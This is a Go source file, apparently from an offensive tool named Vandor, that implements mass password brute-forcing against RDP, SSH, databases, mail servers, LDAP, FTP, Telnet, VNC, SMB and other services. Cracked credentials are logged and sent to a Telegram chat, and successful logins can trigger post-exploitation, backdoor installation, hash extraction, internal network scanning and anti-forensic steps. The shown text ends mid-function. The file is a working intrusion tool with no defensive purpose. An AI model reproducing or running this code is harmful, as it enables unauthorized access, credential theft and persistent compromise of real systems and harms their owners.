package protocols

import (
	"bufio"
	"bytes"
	"context"
	"crypto/rand"
	"crypto/tls"
	"database/sql"
	"encoding/json"
	"fmt"
	"net"
	"net/smtp"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	antiforensic "github.com/batmanpriv/Vandor/AntiFor"
	"github.com/batmanpriv/Vandor/colors"
	"github.com/batmanpriv/Vandor/config"
	"github.com/batmanpriv/Vandor/core"
	"github.com/batmanpriv/Vandor/internal"
	ex "github.com/batmanpriv/Vandor/postexploit"
	"github.com/batmanpriv/Vandor/protocol/nla"
	"github.com/batmanpriv/Vandor/protocol/pdu"
	"github.com/batmanpriv/Vandor/protocol/sec"
	"github.com/batmanpriv/Vandor/protocol/t125"
	"github.com/batmanpriv/Vandor/protocol/tpkt"
	"github.com/batmanpriv/Vandor/protocol/x224"

	"github.com/emersion/go-imap/client"
	"github.com/go-ldap/ldap/v3"
	"github.com/gomodule/redigo/redis"
	"github.com/gosnmp/gosnmp"
	"github.com/jackc/pgx/v4"
	"go.mongodb.org/mongo-driver/mongo"
	"go.mongodb.org/mongo-driver/mongo/options"
	"golang.org/x/crypto/ssh"
	"golang.org/x/time/rate"
)

type StatData struct {
	TotalAttempts    int64   `json:"total_attempts"`
	SuccessRate      float64 `json:"success_rate"`
	AvgTimePerHost   float64 `json:"avg_time_per_host"`
	MostUsedPass     string  `json:"most_used_pass"`
	CommonPattern    string  `json:"common_pattern"`
	HoneypotDetected int     `json:"honeypot_detected"`
	BannedHosts      int     `json:"banned_hosts"`
	GPUSpeedup       float64 `json:"gpu_speedup"`
}

type CircularBuffer struct {
	mu       sync.RWMutex
	buffer   []string
	maxSize  int
	flushCh  chan struct{}
	stopCh   chan struct{}
	wg       sync.WaitGroup
	filename string
	flushed  int64
}

type RDPSuccessCallback func(host, port, user, pass string)

var rdpCallback RDPSuccessCallback

func SetRDPSuccessCallback(cb RDPSuccessCallback) {
	rdpCallback = cb
}

type Job struct {
	Host           string
	Port           string
	User           string
	Password       string
	Timeout        int
	CityIdx        int
	Backdoor       ex.BackdoorConfig
	DoBackdoor     bool
	DoAntiForensic bool
}

type Result struct {
	Success   bool
	Host      string
	Port      string
	User      string
	Password  string
	Banner    string
	RiskScore float64
	Error     error
}

type WorkerPool struct {
	workers int
	jobs    chan Job
	results chan Result
	wg      sync.WaitGroup
	ctx     context.Context
	cancel  context.CancelFunc
	limiter *rate.Limiter
}

type Config struct {
	EnableLearning   bool `json:"enable_learning"`
	MaxWorkers       int  `json:"max_workers"`
	MaxPasswordsGen  int  `json:"max_passwords_gen"`
	HoneypotCheck    bool `json:"honeypot_check"`
	BanThreshold     int  `json:"ban_threshold"`
	GPUEnabled       bool `json:"gpu_enabled"`
	RAMDiskEnabled   bool `json:"ramdisk_enabled"`
	MultiCityEnabled bool `json:"multi_city_enabled"`
}

type CityRoute struct {
	Name    string
	IP      string
	Latency int
}

type CacheItem struct {
	Value     interface{}
	ExpiresAt time.Time
}

type SafeCache struct {
	mu      sync.RWMutex
	data    map[string]CacheItem
	maxSize int
	ttl     time.Duration
	stopCh  chan struct{}
}

var CityRoutes = []CityRoute{
	{"Tehran", "185.110.188.1", 5},
	{"Dubai", "94.200.0.1", 15},
	{"Frankfurt", "3.120.0.1", 30},
	{"London", "13.40.0.1", 35},
	{"NewYork", "3.224.0.1", 60},
	{"Singapore", "13.228.0.1", 45},
	{"Tokyo", "13.112.0.1", 55},
}

var (
	crackedList      []string
	crackedMu        sync.RWMutex
	crackedBuffer    *CircularBuffer
	TotalAttempts    int64
	SuccessAttempts  int64
	FailedAttempts   int64
	afm              *antiforensic.AntiForensicManager
	maxBannerSize    = 4096
	CompletedHosts   int32
	GlobalStop       int32
	LearningMap      = make(map[string]int)
	LearningMu       sync.RWMutex
	PasswordPatterns = []string{
		"%s123", "%s1234", "%s@123", "%s@1234", "%s!123", "%s#123",
		"%s2023", "%s2024", "%s@2023", "%s@2024", "P@ssw0rd%d",
	}
	MaxConcurrent  = 10000
	WorkerPoolSize = 5000
	RateLimit      = 1000
	CheckpointFile = "checkpoint.json"
	checkpointMu   sync.Mutex
)

var (
	rdpCP          *Checkpoint
	doPostExploit  bool
	doBackdoor     bool
	doExtractHash  bool
	doScanNetwork  bool
	doAntiForensic bool
	backdoorCfg    ex.BackdoorConfig
	notifyCracked  bool
)

type Checkpoint struct {
	HostIndex   int               `json:"host_index"`
	UserIndex   int               `json:"user_index"`
	PassIndex   int               `json:"pass_index"`
	Mode        string            `json:"mode"`
	Hosts       []string          `json:"hosts"`
	Users       []string          `json:"users"`
	Passes      []string          `json:"passes"`
	Port        string            `json:"port"`
	Timeout     int               `json:"timeout"`
	Completed   bool              `json:"completed"`
	CrackedMap  map[string]string `json:"cracked_map"`
	FailedHosts map[string]int    `json:"failed_hosts"`
	BannedHosts map[string]string `json:"banned_hosts"`
	mu          sync.RWMutex      `json:"-"`
}

func (cp *Checkpoint) GetBannedHosts() map[string]string {
	cp.RLock()
	defer cp.RUnlock()
	result := make(map[string]string)
	for k, v := range cp.BannedHosts {
		result[k] = v
	}
	return result
}

func (cp *Checkpoint) IsHostBannedSafe(host string) bool {
	cp.RLock()
	defer cp.RUnlock()
	_, exists := cp.BannedHosts[host]
	return exists
}

func (cp *Checkpoint) AddCracked(host, port, user, pass string) {
	cp.Lock()
	defer cp.Unlock()
	if cp.CrackedMap == nil {
		cp.CrackedMap = make(map[string]string)
	}
	key := fmt.Sprintf("%s:%s|%s", host, port, user)
	cp.CrackedMap[key] = pass
}

func (cp *Checkpoint) IsAlreadyCracked(host, port, user string) bool {
	cp.RLock()
	defer cp.RUnlock()
	key := fmt.Sprintf("%s:%s|%s", host, port, user)
	_, exists := cp.CrackedMap[key]
	return exists
}

func SaveCheckpoint(cp *Checkpoint) {
	checkpointMu.Lock()
	defer checkpointMu.Unlock()
	if cp == nil {
		return
	}
	tempFile := CheckpointFile + ".tmp"
	data, err := json.Marshal(cp)
	if err != nil {
		return
	}
	if err := os.WriteFile(tempFile, data, 0644); err != nil {
		return
	}
	os.Rename(tempFile, CheckpointFile)
}

func LoadCheckpoint() (*Checkpoint, error) {
	checkpointMu.Lock()
	defer checkpointMu.Unlock()
	data, err := os.ReadFile(CheckpointFile)
	if err != nil {
		return nil, err
	}
	var cp Checkpoint
	if err := json.Unmarshal(data, &cp); err != nil {
		return nil, err
	}
	if cp.CrackedMap == nil {
		cp.CrackedMap = make(map[string]string)
	}
	if cp.FailedHosts == nil {
		cp.FailedHosts = make(map[string]int)
	}
	if cp.BannedHosts == nil {
		cp.BannedHosts = make(map[string]string)
	}
	if cp.Hosts == nil {
		cp.Hosts = make([]string, 0)
	}
	if cp.Users == nil {
		cp.Users = make([]string, 0)
	}
	if cp.Passes == nil {
		cp.Passes = make([]string, 0)
	}
	return &cp, nil
}

func (c *SafeCache) Set(key string, value interface{}) {
	c.mu.Lock()
	defer c.mu.Unlock()
	if len(c.data) >= c.maxSize {
		toRemove := c.maxSize / 5
		if toRemove < 1 {
			toRemove = 1
		}
		count := 0
		for k := range c.data {
			delete(c.data, k)
			count++
			if count >= toRemove {
				break
			}
		}
	}
	c.data[key] = CacheItem{
		Value:     value,
		ExpiresAt: time.Now().Add(c.ttl),
	}
}

func (c *SafeCache) Get(key string) (interface{}, bool) {
	c.mu.RLock()
	defer c.mu.RUnlock()
	item, ok := c.data[key]
	if !ok {
		return nil, false
	}
	if time.Now().After(item.ExpiresAt) {
		return nil, false
	}
	return item.Value, true
}

func (c *SafeCache) Delete(key string) {
	c.mu.Lock()
	defer c.mu.Unlock()
	delete(c.data, key)
}

func (c *SafeCache) Close() {
	close(c.stopCh)
}

func NewCircularBuffer(filename string, maxSize int) *CircularBuffer {
	cb := &CircularBuffer{
		buffer:   make([]string, 0, maxSize),
		maxSize:  maxSize,
		flushCh:  make(chan struct{}, 1),
		stopCh:   make(chan struct{}),
		filename: filename,
		flushed:  0,
	}

	cb.loadExistingLines()

	go cb.flusher()
	return cb
}

func (cb *CircularBuffer) loadExistingLines() {
	cb.mu.Lock()
	defer cb.mu.Unlock()

	f, err := os.OpenFile(cb.filename, os.O_RDONLY, 0644)
	if err != nil {
		if os.IsNotExist(err) {
			return
		}
		fmt.Printf("[WARN] Could not open existing %s: %v\n", cb.filename, err)
		return
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	buf := make([]byte, 64*1024)
	scanner.Buffer(buf, 1024*1024)

	lineCount := 0
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			cb.buffer = append(cb.buffer, line)
			lineCount++
		}
	}

	if lineCount > 0 {
		fmt.Printf("[LOAD] Loaded %d existing entries from %s\n", lineCount, cb.filename)
	}

	if len(cb.buffer) > cb.maxSize {
		cb.buffer = cb.buffer[len(cb.buffer)-cb.maxSize:]
	}
}

func (cb *CircularBuffer) AppendBatch(lines []string) {
	cb.mu.Lock()
	defer cb.mu.Unlock()
	cb.buffer = append(cb.buffer, lines...)
	if len(cb.buffer) >= cb.maxSize {
		select {
		case cb.flushCh <- struct{}{}:
		default:
		}
	}
}

func (cb *CircularBuffer) Len() int {
	cb.mu.RLock()
	defer cb.mu.RUnlock()
	return len(cb.buffer)
}

func (cb *CircularBuffer) GetStats() (int, int64) {
	cb.mu.RLock()
	defer cb.mu.RUnlock()
	return len(cb.buffer), atomic.LoadInt64(&cb.flushed)
}

func (cb *CircularBuffer) flusher() {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-cb.stopCh:
			cb.flush()
			return
		case <-cb.flushCh:
			cb.flush()
		case <-ticker.C:
			if cb.Len() > 0 {
				cb.flush()
			}
		}
	}
}

func (cb *CircularBuffer) flush() {
	cb.mu.Lock()
	if len(cb.buffer) == 0 {
		cb.mu.Unlock()
		return
	}
	toWrite := make([]string, len(cb.buffer))
	copy(toWrite, cb.buffer)
	cb.buffer = cb.buffer[:0]
	cb.mu.Unlock()

	f, err := os.OpenFile(cb.filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		cb.mu.Lock()
		cb.buffer = append(toWrite, cb.buffer...)
		cb.mu.Unlock()
		return
	}
	defer f.Close()

	for _, line := range toWrite {
		fmt.Fprintf(f, "%s\n", line)
	}
	atomic.AddInt64(&cb.flushed, int64(len(toWrite)))
}

func (cb *CircularBuffer) Close() {
	close(cb.stopCh)
	cb.wg.Wait()
}

func (cb *CircularBuffer) Append(line string) {
	cb.mu.Lock()
	defer cb.mu.Unlock()
	cb.buffer = append(cb.buffer, line)
	if len(cb.buffer) >= cb.maxSize {
		select {
		case cb.flushCh <- struct{}{}:
		default:
		}
	}
}

type RDPClientWrapper struct {
	host    string
	port    string
	user    string
	pass    string
	timeout int
}

func NewRDPClientWrapper(host, port, user, pass string, timeout int) *RDPClientWrapper {
	return &RDPClientWrapper{
		host:    host,
		port:    port,
		user:    user,
		pass:    pass,
		timeout: timeout,
	}
}

func splitUser(user string) (domain string, username string) {
	if strings.Contains(user, "\\") {
		parts := strings.SplitN(user, "\\", 2)
		domain = parts[0]
		username = parts[1]
	} else if strings.Contains(user, "/") {
		parts := strings.SplitN(user, "/", 2)
		domain = parts[0]
		username = parts[1]
	} else {
		domain = ""
		username = user
	}
	return
}

func (c *RDPClientWrapper) QuickLogin() bool {
	done := make(chan bool, 1)

	go func() {
		conn, err := net.DialTimeout("tcp", net.JoinHostPort(c.host, c.port), time.Duration(c.timeout)*time.Second)
		if err != nil {
			done <- false
			return
		}
		defer conn.Close()

		domain, userName := splitUser(c.user)

		socketLayer := core.NewSocketLayer(conn)
		nlaLayer := nla.NewNTLMv2(domain, userName, c.pass)
		tpktLayer := tpkt.New(socketLayer, nlaLayer)
		x224Layer := x224.New(tpktLayer)
		mcsLayer := t125.NewMCSClient(x224Layer)
		secLayer := sec.NewClient(mcsLayer)
		pduLayer := pdu.NewClient(secLayer)

		mcsLayer.SetClientDesktop(800, 600)
		secLayer.SetUser(userName)
		secLayer.SetPwd(c.pass)
		secLayer.SetDomain(domain)

		tpktLayer.SetFastPathListener(secLayer)
		secLayer.SetFastPathListener(pduLayer)
		secLayer.SetChannelSender(mcsLayer)

		var success bool

		secLayer.On("success", func() {
			success = true
		})

		secLayer.On("error", func(err error) {
			errStr := err.Error()

			if strings.Contains(errStr, "access denied") {
				success = false
			} else if strings.Contains(errStr, "STATUS_VALID_CLIENT") {
				success = true
			} else {
				success = false
			}
		})

		err = x224Layer.Connect()
		if err != nil {
			done <- false
			return
		}

		time.Sleep(3 * time.Second)

		done <- success
	}()

	select {
	case result := <-done:
		return result
	case <-time.After(time.Duration(c.timeout+5) * time.Second):
		return false
	}
}

func SetRDPGlobals(
	checkpoint *Checkpoint,
	postExploit, backdoor, extractHash, scanNetwork, antiForensic bool,
	backdoorConfig ex.BackdoorConfig,
	notify bool,
) {
	rdpCP = checkpoint
	doPostExploit = postExploit
	doBackdoor = backdoor
	doExtractHash = extractHash
	doScanNetwork = scanNetwork
	doAntiForensic = antiForensic
	backdoorCfg = backdoorConfig
	notifyCracked = notify
}

func RunRDP(hosts []string, port string, users, passes []string, timeout int) {
	fmt.Printf("%s[RDP-DEBUG] RunRDP called with %d hosts, port=%s, timeout=%d%s\n",
		colors.Yellow, len(hosts), port, timeout, colors.Reset)

	if len(hosts) == 0 || len(users) == 0 || len(passes) == 0 {
		fmt.Printf("%s[ERROR] RDP needs hosts, users and passwords%s\n", colors.Red, colors.Reset)
		return
	}

	if len(hosts) > 0 && len(users) > 0 && len(passes) > 0 {
		fmt.Printf("%s[RDP-DEBUG] Testing first combination: %s@%s:%s with pass: %s%s\n",
			colors.Cyan, users[0], hosts[0], port, passes[0], colors.Reset)
	}

	fmt.Printf("[RDP] Cracking %d hosts on port %s | Users: %d | Passwords: %d | Timeout: %ds\n",
		len(hosts), port, len(users), len(passes), timeout)

	var wg sync.WaitGroup
	sem := make(chan struct{}, MaxConcurrent)
	var cracked int32

	for _, host := range hosts {
		if rdpCP != nil && rdpCP.IsHostBannedSafe(host) {
			fmt.Printf("%s[SKIP] Host %s is banned%s\n", colors.Yellow, host, colors.Reset)
			continue
		}

		for _, user := range users {
			for _, pass := range passes {
				if atomic.LoadInt32(&GlobalStop) == 1 {
					break
				}

				wg.Add(1)
				sem <- struct{}{}

				go func(h, u, p string) {
					defer wg.Done()
					defer func() { <-sem }()

					client := NewRDPClientWrapper(h, port, u, p, timeout)
					success := client.QuickLogin()
					if success {
						atomic.AddInt32(&cracked, 1)
						atomic.AddInt64(&SuccessAttempts, 1)

						fmt.Printf("\n%s✓ RDP CRACKED!%s %s@%s:%s | %s\n",
							colors.Green, colors.Reset, u, h, port, p)

						if rdpCallback != nil {
							rdpCallback(h, port, u, p)
						}

						entry := fmt.Sprintf("%s:%s|%s:%s|RDP", h, port, u, p)
						crackedMu.Lock()
						crackedList = append(crackedList, entry)
						if crackedBuffer != nil {
							crackedBuffer.Append(entry)
						}
						crackedMu.Unlock()

						if rdpCP != nil {
							rdpCP.AddCracked(h, port, u, p)
							SaveCheckpoint(rdpCP)
						}

						if config.TelegramToken != "" && config.TelegramChatID != "" && notifyCracked {
							go internal.SendTelegramNotification("cracked", map[string]interface{}{
								"host":   h,
								"port":   port,
								"user":   u,
								"pass":   p,
								"banner": "RDP",
							})
						}

						if doPostExploit {
							go ex.P0stExploit(h, port, u, p)
						}

						if doBackdoor {
							go ex.InstallBackdoor(h, port, u, p, backdoorCfg)
						}

						if doExtractHash {
							go ex.ExtractHashes(h, port, u, p)
						}

						if doScanNetwork {
							go scanInternalNetwork(h, port, u, p)
						}

						if doAntiForensic && afm != nil {
							fmt.Printf("%s[ANTI-FORENSIC] RDP anti-forensic requires separate implementation%s\n",
								colors.Yellow, colors.Reset)
						}
					} else {
						atomic.AddInt64(&FailedAttempts, 1)
					}

					atomic.AddInt64(&TotalAttempts, 1)
				}(host, user, pass)
			}

			if atomic.LoadInt32(&GlobalStop) == 1 {
				break
			}
		}

		if atomic.LoadInt32(&GlobalStop) == 1 {
			break
		}
	}

	wg.Wait()
	fmt.Printf("\n[RDP] Complete! %d credentials found | Total attempts: %d | Success: %d | Failed: %d\n",
		cracked, TotalAttempts, SuccessAttempts, FailedAttempts)
}

func RunPostgreSQL(host, port string, user, pass string, timeout int) bool {
	if port == "" {
		port = "5432"
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()
	connStr := fmt.Sprintf("postgres://%s:%s@%s:%s/postgres?sslmode=disable", user, pass, host, port)
	config, err := pgx.ParseConfig(connStr)
	if err != nil {
		return false
	}
	conn, err := pgx.ConnectConfig(ctx, config)
	if err != nil {
		return false
	}
	defer conn.Close(ctx)
	return conn.Ping(ctx) == nil
}

func RunMSSQL(host, port string, user, pass string, timeout int) bool {
	if port == "" {
		port = "1433"
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()
	connStr := fmt.Sprintf("sqlserver://%s:%s@%s:%s?database=master", user, pass, host, port)
	db, err := sql.Open("sqlserver", connStr)
	if err != nil {
		return false
	}
	defer db.Close()
	return db.PingContext(ctx) == nil
}

func RunRedis(host, port string, pass string, timeout int) bool {
	if port == "" {
		port = "6379"
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()
	conn, err := redis.DialContext(ctx, "tcp", net.JoinHostPort(host, port))
	if err != nil {
		return false
	}
	defer conn.Close()
	if pass != "" {
		_, err = conn.Do("AUTH", pass)
		if err != nil {
			return false
		}
	}
	_, err = conn.Do("PING")
	return err == nil
}

func RunMongoDB(host, port string, user, pass string, timeout int) bool {
	if port == "" {
		port = "27017"
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()
	uri := fmt.Sprintf("mongodb://%s:%s@%s:%s", user, pass, host, port)
	clientOpts := options.Client().ApplyURI(uri).SetConnectTimeout(time.Duration(timeout) * time.Second)
	conn, err := mongo.Connect(ctx, clientOpts)
	if err != nil {
		return false
	}
	defer conn.Disconnect(ctx)
	return conn.Ping(ctx, nil) == nil
}

func RunPOP3(host, port string, user, pass string, timeout int) bool {
	if port == "" {
		port = "110"
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()
	var dialer net.Dialer
	conn, err := dialer.DialContext(ctx, "tcp", net.JoinHostPort(host, port))
	if err != nil {
		return false
	}
	defer conn.Close()
	reader := bufio.NewReader(conn)
	line, _ := reader.ReadString('\n')
	if !strings.Contains(line, "+OK") {
		return false
	}
	fmt.Fprintf(conn, "USER %s\r\n", user)
	line, _ = reader.ReadString('\n')
	if !strings.Contains(line, "+OK") {
		return false
	}
	fmt.Fprintf(conn, "PASS %s\r\n", pass)
	line, _ = reader.ReadString('\n')
	return strings.Contains(line, "+OK")
}

func RunIMAP(host, port string, user, pass string, timeout int) bool {
	if port == "" {
		port = "143"
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()
	conn, err := client.DialTLS(net.JoinHostPort(host, port), &tls.Config{InsecureSkipVerify: true})
	if err != nil {
		conn, err = client.Dial(net.JoinHostPort(host, port))
		if err != nil {
			return false
		}
	}
	defer conn.Logout()
	done := make(chan bool)
	go func() {
		err := conn.Login(user, pass)
		done <- (err == nil)
	}()
	select {
	case result := <-done:
		return result
	case <-ctx.Done():
		return false
	}
}

func RunSMTP(host, port string, user, pass string, timeout int) bool {
	if port == "" {
		port = "25"
	}
	auth := smtp.PlainAuth("", user, pass, host)
	client, err := smtp.Dial(net.JoinHostPort(host, port))
	if err != nil {
		return false
	}
	defer client.Close()
	if ok, _ := client.Extension("AUTH"); ok {
		err = client.Auth(auth)
		return err == nil
	}
	return false
}

func RunSNMP(host, port string, community string, timeout int) bool {
	if port == "" {
		port = "161"
	}
	g := gosnmp.Default
	g.Target = host
	g.Port = 161
	g.Community = community
	g.Version = gosnmp.Version2c
	g.Timeout = time.Duration(timeout) * time.Second
	err := g.Connect()
	if err != nil {
		return false
	}
	defer g.Conn.Close()
	oids := []string{"1.3.6.1.2.1.1.1.0"}
	_, err = g.Get(oids)
	return err == nil
}

func RunLDAP(host, port string, user, pass string, timeout int) bool {
	if port == "" {
		port = "389"
	}
	conn, err := ldap.DialURL(fmt.Sprintf("ldap://%s:%s", host, port))
	if err != nil {
		return false
	}
	defer conn.Close()
	err = conn.Bind(user, pass)
	return err == nil
}

func RunFTP(host, port string, user, pass string, timeout int) bool {
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()
	var dialer net.Dialer
	conn, err := dialer.DialContext(ctx, "tcp", net.JoinHostPort(host, port))
	if err != nil {
		return false
	}
	defer conn.Close()
	conn.SetReadDeadline(time.Now().Add(time.Duration(timeout) * time.Second))
	buf := make([]byte, 1024)
	_, err = conn.Read(buf)
	if err != nil {
		return false
	}
	fmt.Fprintf(conn, "USER %s\r\n", user)
	conn.Read(buf)
	fmt.Fprintf(conn, "PASS %s\r\n", pass)
	n, _ := conn.Read(buf)
	return strings.Contains(string(buf[:n]), "230")
}

func RunMySQL(host, port string, user, pass string, timeout int) bool {
	if port == "" {
		port = "3306"
	}
	dsn := fmt.Sprintf("%s:%s@tcp(%s:%s)/mysql?timeout=%ds&readTimeout=%ds&writeTimeout=%ds", user, pass, host, port, timeout, timeout, timeout)
	db, err := sql.Open("mysql", dsn)
	if err != nil {
		return false
	}
	defer db.Close()
	db.SetConnMaxLifetime(time.Duration(timeout) * time.Second)
	db.SetMaxOpenConns(1)
	db.SetMaxIdleConns(1)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()
	return db.PingContext(ctx) == nil
}

func RunTelnet(host, port string, user, pass string, timeout int) bool {
	if port == "" {
		port = "23"
	}
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), time.Duration(timeout)*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(time.Duration(timeout) * time.Second))
	buf := make([]byte, 256)
	conn.Read(buf)
	fmt.Fprintf(conn, "%s\r\n", user)
	time.Sleep(500 * time.Millisecond)
	conn.Read(buf)
	fmt.Fprintf(conn, "%s\r\n", pass)
	time.Sleep(1 * time.Second)
	n, err := conn.Read(buf)
	if err != nil {
		return false
	}
	resp := strings.ToLower(string(buf[:n]))
	failPatterns := []string{"login failed", "login incorrect", "authentication failed", "access denied", "invalid password", "invalid username"}
	for _, pattern := range failPatterns {
		if strings.Contains(resp, pattern) {
			return false
		}
	}
	successPatterns := []string{"$", "#", ">", "%", "~", "welcome", "connected", "successful"}
	for _, pattern := range successPatterns {
		if strings.Contains(resp, pattern) {
			return true
		}
	}
	fmt.Fprintf(conn, "echo test\r\n")
	time.Sleep(500 * time.Millisecond)
	n, err = conn.Read(buf)
	if err == nil && strings.Contains(string(buf[:n]), "test") {
		return true
	}
	return false
}

func RunVNC(host, port string, password string, timeout int) bool {
	if port == "" {
		port = "5900"
	}
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), time.Duration(timeout)*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(time.Duration(timeout) * time.Second))
	version := make([]byte, 12)
	_, err = conn.Read(version)
	if err != nil {
		return false
	}
	ourVersion := []byte("RFB 003.008\n")
	if _, err := conn.Write(ourVersion); err != nil {
		return false
	}
	secTypeCount := make([]byte, 1)
	_, err = conn.Read(secTypeCount)
	if err != nil {
		return false
	}
	if secTypeCount[0] == 0 {
		return false
	}
	secTypes := make([]byte, secTypeCount[0])
	_, err = conn.Read(secTypes)
	if err != nil {
		return false
	}
	vncAuthSupported := false
	for _, t := range secTypes {
		if t == 2 {
			vncAuthSupported = true
			break
		}
	}
	if !vncAuthSupported {
		return false
	}
	_, err = conn.Write([]byte{2})
	if err != nil {
		return false
	}
	challenge := make([]byte, 16)
	_, err = conn.Read(challenge)
	if err != nil {
		return false
	}
	key := make([]byte, 8)
	copy(key, []byte(password))
	for i := len(password); i < 8; i++ {
		key[i] = 0
	}
	for i := 0; i < 8; i++ {
		key[i] = (key[i] & 0xFE) | ((key[i] >> 7) & 1)
	}
	response := make([]byte, 16)
	for i := 0; i < 8; i++ {
		response[i] = challenge[i] ^ key[i]
		response[i+8] = challenge[i+8] ^ key[i]
	}
	_, err = conn.Write(response)
	if err != nil {
		return false
	}
	result := make([]byte, 4)
	_, err = conn.Read(result)
	if err != nil {
		return false
	}
	return result[0] == 0 && result[1] == 0 && result[2] == 0 && result[3] == 0
}

func RunSMB(host, port string, user, pass string, timeout int) bool {
	if port == "" {
		port = "445"
	}
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), time.Duration(timeout)*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(time.Duration(timeout) * time.Second))
	negotiate := []byte{
		0x00, 0x00, 0x00, 0x85, 0xFF, 0x53, 0x4D, 0x42,
		0x72, 0x00, 0x00, 0x00, 0x00, 0x18, 0x53, 0xC8,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x02, 0x4E, 0x54, 0x20,
		0x4C, 0x4D, 0x20, 0x30, 0x2E, 0x31, 0x32, 0x00,
	}
	if _, err := conn.Write(negotiate); err != nil {
		return false
	}
	resp := make([]byte, 1024)
	n, err := conn.Read(resp)
	if err != nil || n < 36 {
		return false
	}
	if resp[4] != 0xFF {
		return false
	}
	sessionSetup := []byte{
		0x00, 0x00, 0x00, 0x4A, 0xFF, 0x53, 0x4D, 0x42,
		0x73, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xC0,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	}
	if _, err := conn.Write(sessionSetup); err != nil {
		return false
	}
	resp = make([]byte, 1024)
	n, err = conn.Read(resp)
	if err != nil {
		return false
	}
	if n < 8 {
		return false
	}
	status := uint32(resp[8]) | uint32(resp[9])<<8 | uint32(resp[10])<<16 | uint32(resp[11])<<24
	return status == 0x00000000
}

func randomInt(max int) int {
	if max <= 1 {
		return 0
	}
	var b [8]byte
	_, err := rand.Read(b[:])
	if err != nil {
		return int(time.Now().UnixNano() % int64(max))
	}
	n := (uint64(b[0])<<56 | uint64(b[1])<<48 | uint64(b[2])<<40 | uint64(b[3])<<32 |
		uint64(b[4])<<24 | uint64(b[5])<<16 | uint64(b[6])<<8 | uint64(b[7])) % uint64(max)
	return int(n)
}

func randomDelay(minDelay, maxDelay int) {
	if minDelay > 0 && maxDelay > 0 && minDelay < maxDelay {
		delay := randomInt(maxDelay-minDelay) + minDelay
		if delay > 0 {
			time.Sleep(time.Duration(delay) * time.Millisecond)
		}
	}
}

func massPwn(hosts []string, port string, users, passes []string, timeout int, threads int) {
	fmt.Printf("%s[MASS PWN] Launching simultaneous attack on %d hosts with %d threads%s\n", colors.Magenta, len(hosts), threads, colors.Reset)
	var wg sync.WaitGroup
	sem := make(chan struct{}, threads)
	var cracked int32
	totalCombinations := len(hosts) * len(users) * len(passes)
	for _, host := range hosts {
		for _, user := range users {
			for _, pass := range passes {
				wg.Add(1)
				sem <- struct{}{}
				go func(h, u, p string) {
					defer wg.Done()
					defer func() { <-sem }()
					cfg := &ssh.ClientConfig{
						User:            u,
						Auth:            []ssh.AuthMethod{ssh.Password(p)},
						HostKeyCallback: ssh.InsecureIgnoreHostKey(),
						Timeout:         time.Duration(timeout) * time.Second,
					}
					conn, err := ssh.Dial("tcp", net.JoinHostPort(h, port), cfg)
					if err != nil {
						return
					}
					defer conn.Close()
					atomic.AddInt32(&cracked, 1)
					fmt.Printf("\n%s💀 MASS PWN CRACKED:%s %s@%s:%s | %s\n", colors.Green, colors.Reset, u, h, port, p)
					crackedMu.Lock()
					entry := fmt.Sprintf("%s:%s|%s:%s|mass_pwn", h, port, u, p)
					crackedList = append(crackedList, entry)
					if crackedBuffer != nil {
						crackedBuffer.Append(entry)
					}
					crackedMu.Unlock()
					if config.TelegramToken != "" && config.TelegramChatID != "" {
						go internal.SendTelegramNotification("cracked", map[string]interface{}{
							"host": h, "port": port, "user": u, "pass": p, "banner": "mass_pwn",
						})
					}
				}(host, user, pass)
			}
		}
	}
	wg.Wait()
	fmt.Printf("%s[MASS PWN] Complete! %d/%d combinations cracked%s\n", colors.Green, cracked, totalCombinations, colors.Reset)
}

func NewWorkerPool(workers int, rateLimit int) *WorkerPool {
	ctx, cancel := context.WithCancel(context.Background())
	limiter := rate.NewLimiter(rate.Limit(rateLimit), rateLimit)
	return &WorkerPool{
		workers: workers,
		jobs:    make(chan Job, workers*2),
		results: make(chan Result, workers*2),
		ctx:     ctx,
